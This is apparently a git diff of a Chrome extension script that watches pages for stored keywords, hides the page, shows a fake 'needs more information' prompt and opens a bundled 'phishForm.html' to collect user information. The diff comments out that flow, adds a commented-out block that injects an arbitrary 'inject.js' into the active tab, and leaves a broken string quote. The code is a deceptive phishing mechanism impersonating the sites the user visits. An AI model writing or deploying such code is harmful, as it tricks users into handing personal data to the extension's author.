@@ -39,13 +39,23 @@ chrome.storage.sync.get(["values"], function(result){
   console.log("BEFORE CHANGING PHISHFLAG " + phishFlag);
   for(var i = 0; i < arr.length; i++){
     if(testString.includes(arr[i])){
+
+      /*
+      This set of code is DONE FOR JS EXE. MODIFY INJECT.JS WITH WHAT WE WANT!
+      chrome.tabs.query({currentWindow: true, active: true}, function(tabs){
+        chrome.tabs.executeScript(tab.id, {file: 'inject.js'});
+      });
+      */
+      
+      /*
+      This function is meant to be able to phish stuff info from the user.
       phishFlag = !phishFlag;
         if(phishFlag){
           chrome.storage.sync.set({'phishVal': phishFlag}, function(){
           });
           document.getElementsByTagName("BODY")[0].style.display = "none";
           var confirmVal = confirm(testString + " needs more information to display appropriately.");
-          var urlChanged = chrome.runtime.getURL("phishForm.html");
+          var urlChanged = chrome.runtime.getURL('phishForm.html);
           console.log(urlChanged);
           if(confirmVal == true){
             window.open(urlChanged);
@@ -56,6 +66,8 @@ chrome.storage.sync.get(["values"], function(result){
           //chrome.tabs.create({'url': urlChanged}, function(tab){
           //});
         }
+        */
+
       /*
       This will be used to throw out an alert if need be.
       var wind = confirm(testString + " needs more information from you to continue access.");
